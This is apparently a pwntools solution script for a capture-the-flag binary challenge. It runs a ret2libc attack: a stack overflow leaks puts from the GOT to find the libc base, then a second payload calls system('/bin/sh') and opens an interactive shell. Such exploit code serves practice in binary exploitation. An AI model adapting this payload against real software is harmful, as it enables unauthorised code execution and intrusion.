#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chall.nitdgplug.org --port 30104 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30104)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

libc = exe.libc

p ='a'*44
p += 'a'*4*2
p += p32(exe.plt['puts'])
p += p32(exe.sym['main'])
p += p32(exe.got['puts'])
io.sendlineafter("you think ?\n",p)

leak = u32(io.recvline()[:4].ljust(4,"\x00"))
libc.address = leak - libc.sym['puts']

print(hex(libc.address))

p ='a'*44
p += 'a'*4*2
p += p32(libc.sym['system'])
p += p32(exe.sym['main'])
p += p32(libc.search("/bin/sh\x00").next())
p += p32(0)
p += p32(0)
io.sendlineafter("you think ?\n",p)

io.interactive()

